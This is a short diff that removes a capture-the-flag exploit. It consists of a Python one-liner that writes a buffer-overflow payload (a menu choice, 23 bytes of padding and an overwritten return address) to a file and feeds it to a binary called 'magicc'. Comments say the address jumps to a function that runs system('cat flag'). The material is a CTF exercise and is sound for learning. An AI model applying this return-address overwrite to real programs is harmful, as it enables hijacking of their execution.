@@ -1,5 +1,0 @@
-python -c "print '4' + 'A'*23 + '\xa7\x85\x04\x08'" > pattern
-./magicc < pattern
-
-# 4, is the fourth option, which locates vulnerable funtion sym.Slytherin.
-"\xa7\x85\x04\x08" is the funtion addr that call system("cat flag");
